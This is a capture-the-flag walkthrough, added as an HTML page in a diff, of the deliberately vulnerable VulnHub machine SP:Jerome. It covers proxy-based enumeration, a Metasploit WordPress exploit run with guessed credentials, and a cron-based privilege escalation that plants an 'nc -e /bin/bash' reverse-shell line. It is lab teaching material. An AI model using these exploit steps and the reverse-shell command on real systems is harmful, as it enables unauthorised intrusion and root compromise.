@@ -1,0 +1,110 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
+            <h1 class="post-title entry-title">SP:Jerome: Vulnhub Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/spjerome-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2019-07-28T17:15:38+00:00">July 28, 2019</time><time class="updated" datetime="2025-06-10T20:11:27+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Today we are going to take another CTF challenge from the series of SP:Jerome. The credit for making this VM machine goes to “Daniel Solstad” and it’s a boot2root challenge where we have to root the server and capture the flag to complete the challenge. You can download this VM <strong><a style="color: #000000;" href="https://www.vulnhub.com/entry/sp-jerome-v101,303/">here</a></strong>.</span></p>
+<p><span style="color: #000000;"><strong>Security Level</strong>: Intermediate</span></p>
+<h3><span style="color: #800000;"><strong>Penetrating Methodology:</strong></span></h3>
+<ol>
+<li><span style="color: #000000;"><strong>Scanning</strong></span></li>
+</ol>
+<ul>
+<li><span style="color: #000000;">Netdiscover</span></li>
+<li><span style="color: #000000;">NMAP</span></li>
+</ul>
+<ol start="2">
+<li><span style="color: #000000;"><strong>Enumeration</strong></span></li>
+</ol>
+<ul>
+<li><span style="color: #000000;">Dirbuster</span></li>
+<li><span style="color: #000000;">WPScan</span></li>
+</ul>
+<ol start="3">
+<li><span style="color: #000000;"><strong>Exploitation</strong></span></li>
+</ol>
+<ul>
+<li><span style="color: #000000;">Metasploit</span></li>
+</ul>
+<ol start="4">
+<li><span style="color: #000000;"><strong>Privilege Escalation</strong></span></li>
+</ol>
+<ul>
+<li><span style="color: #000000;">Exploiting Crontab</span></li>
+</ul>
+<h4><span style="color: #000000;">Walkthrough</span></h4>
+<h3><span style="color: #800000;"><strong>Scanning</strong></span></h3>
+<p><span style="color: #000000;">Let’s start of by scanning the network and identifying the host IP address. We can identify our host IP as 192.168.1.104 by using Netdiscover.</span></p>
+<pre class="lang:default decode:true">netdiscover</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ZWiurI1rJMM/XT3TNDlMdwI/AAAAAAAAfp0/LXQ62jMO5tQTi23tuBHZy1Fbyi5TIjKVQCLcBGAs/s1600/1.png"/></span></p>
+<p><span style="color: #000000;">We used Nmap for port enumeration and found that only port 8080 is open on which a squid proxy is running, which means our target machine is a proxy server.</span></p>
+<pre class="lang:default decode:true">nmap –A 192.168.1.104</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-zxD4HNaR3BE/XT3TQFhyvNI/AAAAAAAAfqU/RPZcPzlMbSsrb6XyVvmobIqmS9tcIGpYgCLcBGAs/s1600/2.1.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
+<p><span style="color: #000000;">Since the target machine was behind the proxy so we may not get desired results from any direct enumeration technique. We tried using <strong>dirb </strong>with a proxy for directory brute forcing but didn’t get anything. Then we tried <strong>Dirbuster </strong>with proxy and got one directory named called <strong>/server-status.</strong></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-UGgXd5O15M4/XT3TQR5469I/AAAAAAAAfqY/SMnFvXA_OoQXsVjXHhDL-oapUPC--cwCwCLcBGAs/s1600/2.png"/></span></p>
+<p><span style="color: #000000;">To set up a proxy in Dirbuster go to <strong>Advance options</strong> then click on <strong>Http Options </strong>and check the <strong>Run through a Proxy </strong>box and enter the <strong>host IP</strong> and <strong>port number.</strong></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ZpdMF3-mQ-g/XT3TQWiHL0I/AAAAAAAAfqc/xD4k_UB6mQgW7UTV00ubeidEt94XgGDrACLcBGAs/s1600/3.png"/></span></p>
+<p><span style="color: #000000;">we got http 200 Ok response for <strong>/server-status</strong> from its result.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-fSahlZQd7uQ/XT3TQwGkyJI/AAAAAAAAfqg/IVPVcfIJxtw0ms3TDhCyYjaXto0d3u8OACLcBGAs/s1600/4.png"/></span></p>
+<p><span style="color: #000000;">So to access the URL 127.0.0.1/server-status in the browser we first set up our proxy using the foxyproxy or directly in the settings of the browser.</span></p>
+<p><span style="color: #000000;">We have done here using the foxyproxy plugin.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-sDbQlVhGkqE/XT3TRC1UviI/AAAAAAAAfqk/MRhUD_5r7CY9n1R-D1DVJQwJW0xc_2u1ACLcBGAs/s1600/5.png"/></span></p>
+<p><span style="color: #000000;">Then we accessed the URL and found that there is one more port open on the target machine i.e <strong>1337.</strong></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-B2JScISThfg/XT3TRUCQAcI/AAAAAAAAfqo/T4FSKxxbLfkIgYnlYOGzmfoMmHUHoZALQCLcBGAs/s1600/6.png"/></span></p>
+<p><span style="color: #000000;">After accessing the URL <strong>127.0.0.1:1337</strong> we couldn’t find anything there.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-jTIyLt9oxI0/XT3TRwecebI/AAAAAAAAfqs/7Qph4idfxnMf_3oyXVRbtRN96LXEH8gRACLcBGAs/s1600/7.png"/></span></p>
+<p><span style="color: #000000;">So we again used <strong>Dirbuster </strong>for brute force and got a directory named <strong>/wordpress.</strong></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-uarne-RUhSk/XT3TSPNaQpI/AAAAAAAAfqw/VE3F7GVG9h8OGpmgrFzgsQ5_KvZDozoQgCLcBGAs/s1600/8.png"/></span></p>
+<p>This time I found the directory for /wordpress.</p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-2q-GQQ2mJNA/XT3TSTC4r2I/AAAAAAAAfq0/NYBuO6sHR9wC1mK97uYvcKvoEE_zFoXUgCLcBGAs/s1600/9.png"/></span></p>
+<p><span style="color: #000000;">After accessing the URL we got a WordPress site. </span><span style="color: #000000;">So we used <strong>WPScan </strong>with proxy to find any vulnerability on the just found WordPress site.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ZZnXQVnV2E8/XT3TNCACuRI/AAAAAAAAfp4/uNH0PRg9bnUGn0E3gZq-JLXvlOitqT0KwCLcBGAs/s1600/10.png"/></span></p>
+<pre class="lang:default decode:true">wpscan --url http://127.0.0.1:1337/wordpress --proxy http://192.168.1.104:8080 -e u</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-t1O4xCUkcPM/XT3TNCaAF1I/AAAAAAAAfpw/icY9PYDS_gI-08bzpWBX7sdyCTY0LJeQACLcBGAs/s1600/11.png"/></span></p>
+<p><span style="color: #000000;">In the results of the scan we found that the site has two wp admins <strong>root </strong>&amp; <strong>Jerome.</strong></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-oeCyGQfA7Po/XT3TN0IKj_I/AAAAAAAAfp8/BtUqXeHR35YHnFhq-IOj4yZxtU4T6s8XwCLcBGAs/s1600/12.png"/></span></p>
+<p><span style="color: #000000;">Also, we got to know that there is a code execution vulnerability present on the website for which the exploit is already present in the Metasploit.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-TnV-DL1wctQ/XT3TOSfPwxI/AAAAAAAAfqE/tq9IewFEb2Qgl84KchSWi-0iv-KyVQ3SACLcBGAs/s1600/13.png"/></span></p>
+<h3><span style="color: #000000;"><strong><span style="color: #800000;">Exploitation</span>:</strong></span></h3>
+<p><span style="color: #000000;">We used the same exploit in msf which was given by our WPScan results.</span></p>
+<p><span style="color: #000000;">Since this was an authenticated code execution exploit which means we have to enter the credentials, we put in the jerome jerome as username and password and it came out to be correct and we got a meterpreter shell.</span></p>
+<pre class="lang:default decode:true">use exploit/multi/http/wp_crop_rce
+set rhosts 127.0.0.1
+set proxies http:192.168.1.104:8080
+set username jerome
+set password jerome
+set targeturi /wordpress
+set rport 1337
+set ReverseAllowProxy true
+set lhost 192.168.1.105
+exploit</pre>
+<p><span style="color: #000000;"><strong><img decoding="async" src="https://1.bp.blogspot.com/-WtZxWVpYtpo/XT3TOdK9FvI/AAAAAAAAfqA/uYA7GNHl6rMWWXeXPFUDQ6Pn0PkpkKiDgCLcBGAs/s1600/14.png"/></strong></span></p>
+<p><span style="color: #000000;">We looked into the /home/Jerome directory and got our first <strong>flag.</strong></span></p>
+<p><span style="color: #000000;">Now it was time to get to the root shell and get out the final flag. We looked here and there to get something useful and in the process, we checked into the crontab file and found that there is one script <strong>simulate.sh </strong>scheduled after every reboot.</span></p>
+<p><span style="color: #000000;">The simulate.sh file is tasked to run three commands cd, ls and sleep.</span></p>
+<pre class="lang:default decode:true">cd jerome
+cat flag.txt
+cat /etc/crontab
+cat /usr/share/simulate.sh</pre>
+<p>we found a script “simulate.sh” will run as cronjob on reboot and the script was running “ls” file within /home/jerome and then sleep for 120 s.</p>
+<p><strong style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-5rdJRGwuryA/XT3TO2rUy1I/AAAAAAAAfqI/sNJNOpeZfSQhAyQoWl52Q7-d0CGD0euxACLcBGAs/s1600/15.png"/></strong></p>
+<h3><span style="color: #800000;"><strong>Privilege Escalation:</strong></span></h3>
+<p><span style="color: #000000;">To elevate to the root shell what we did is we edited the <strong>ls </strong>file using the echo command in which we have written the netcat export bash shell one-liner which actually exports the bash shell of the victim machine to the listener machine. Then reboot to the VM machine to so that “simulate” script gets execute through cronjob and wait for netcat session.</span></p>
+<pre class="lang:default decode:true ">shell
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+echo "nc -e /bin/bash 192.168.1.105 1234" &gt;&gt; ls
+chmod 777 ls</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-40Un3RINKOU/XT3TPErKVyI/AAAAAAAAfqM/qSDiH6-GCDkTDX2lwddylDhXncZISQ7KQCLcBGAs/s1600/16.png"/></strong></span></p>
+<p><span style="color: #000000;">On our kali, we started the nc listener on the same port and after rebooting the target system we got the <strong>root shell</strong> and finally the <strong>root flag.</strong></span></p>
+<pre class="lang:default decode:true">nc –lvp 1234
+id
+cat flag.txt</pre>
+<p><img decoding="async" style="color: #000000;" src="https://1.bp.blogspot.com/-dKMUh36rMFA/XT3TPR40J_I/AAAAAAAAfqQ/5PQwJNXHuFsDw1-VJkiWoZmdaVyNDAu5wCLcBGAs/s1600/17.png"/></p>
+<p><span style="color: #000000;"><strong>Author</strong>: Auqib Wani is a Certified Ethical Hacker, Penetration Tester and a Tech Enthusiast with more than 5 years of experience in the field of Network &amp; Cyber Security. Contact <strong><a style="color: #000000;" href="https://www.linkedin.com/in/auqib-wani-14210a71/">Here</a></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
